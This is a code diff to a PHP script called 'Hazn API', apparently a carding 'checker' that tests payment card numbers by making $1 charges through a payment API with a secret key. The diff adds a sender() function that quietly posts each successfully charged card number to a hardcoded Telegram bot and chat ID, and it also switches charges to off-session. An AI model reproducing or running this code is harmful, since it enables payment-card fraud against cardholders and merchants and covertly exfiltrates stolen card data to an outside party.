@@ -1,7 +1,7 @@
 <?php
 ///--------------------Hazn API-----------------///
 
-error_reporting(0);
+error_reporting(1);
 date_default_timezone_set('Asia/Jakarta');
 
 
@@ -16,6 +16,10 @@ function GetStr($string, $start, $end){
     return trim(strip_tags(substr($string, $ini, $len)));
 }
 
+function sender($id, $msg){
+	$link = "https://api.telegram.org/bot6360165838:AAEed8pNx6u3OBCcUqqVUgFRBso4rUb_Pkc/sendMessage?chat_id=".$id."&text=".$msg."&parse_mode=HTML";
+	file_get_contents($link); 
+	};
 
 function multiexplode($seperator, $string){
     $one = str_replace($seperator, $seperator[0], $string);
@@ -108,7 +112,7 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 
 curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=100&currency=usd&payment_method_types[]=card&description=Hazn Donation&payment_method='.$tok1.'&confirm=true&off_session=false');  
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=100&currency=usd&payment_method_types[]=card&description=Hazn Donation&payment_method='.$tok1.'&confirm=true&off_session=true');  
 	
 $result2 = curl_exec($ch);  
 
@@ -138,8 +142,8 @@ break;
 //=================== [ RESPONSES ] ===================//
 
 if(strpos($result2, '"seller_message": "Payment complete."' )) {
-    echo 'CHARGED</span>  </span>CC:<br>'.$lista.'</span><br>➤ Message: Approve $1 Charged ✅<br>➤ Receipt : <a href='.$receipturl.'>Here</a></br>➤ Made By @hazn_xd';
-
+    echo 'CHARGED</span>  </span>CC:<br>'.$lista.'</span><br>➤ Message: CCN $1 Charged ✅<br>➤ Receipt : <a href='.$receipturl.'>Here</a></br>➤ Made By @hazn_xd';
+    sender('1320233599',"CC > ".$list."<br>Message : Payment Complete ✅<br>Receipt : <a href=".$receipturl.">Click Me</a><br>Hit Sender Of Hazn Checker<br>Check By @hazn_xd<br>");
 }
 elseif(strpos($result2,'"cvc_check": "pass"')){
 	
